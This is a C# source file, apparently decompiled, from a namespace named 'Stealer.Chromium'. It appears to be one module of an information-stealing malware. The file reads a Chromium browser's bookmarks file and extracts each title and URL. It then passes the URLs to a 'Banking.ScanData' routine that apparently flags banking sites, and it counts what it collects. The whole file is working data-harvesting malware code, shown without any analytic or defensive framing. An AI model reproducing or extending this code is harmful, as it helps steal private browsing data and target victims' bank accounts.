using System;
using System.Collections.Generic;
using System.IO;
using System.Text;
using System.Text.RegularExpressions;

namespace Stealer.Chromium
{
	// Token: 0x02000037 RID: 55
	internal sealed class Bookmarks
	{
		// Token: 0x060000EC RID: 236 RVA: 0x00008268 File Offset: 0x00006468
		public static List<Bookmark> Get(string sBookmarks)
		{
			List<Bookmark> result;
			try
			{
				List<Bookmark> list = new List<Bookmark>();
				if (!File.Exists(sBookmarks))
				{
					result = list;
				}
				else
				{
					foreach (string text in Regex.Split(Regex.Split(Regex.Split(File.ReadAllText(sBookmarks, Encoding.UTF8), "      \"bookmark_bar\": {")[1], "      \"other\": {")[0], "},"))
					{
						if (text.Contains("\"name\": \"") && text.Contains("\"type\": \"url\",") && text.Contains("\"url\": \"http"))
						{
							int num = 0;
							foreach (string data in Regex.Split(text, Parser.separator))
							{
								num++;
								Bookmark item = default(Bookmark);
								if (Parser.DetectTitle(data))
								{
									item.sTitle = Parser.Get(text, num);
									item.sUrl = Parser.Get(text, num + 2);
									if (!string.IsNullOrEmpty(item.sTitle) && !string.IsNullOrEmpty(item.sUrl) && !item.sUrl.Contains("Failed to parse url"))
									{
										Banking.ScanData(item.sUrl);
										Counter.Bookmarks++;
										list.Add(item);
									}
								}
							}
						}
					}
					result = list;
				}
			}
			catch
			{
				result = new List<Bookmark>();
			}
			return result;
		}
	}
}
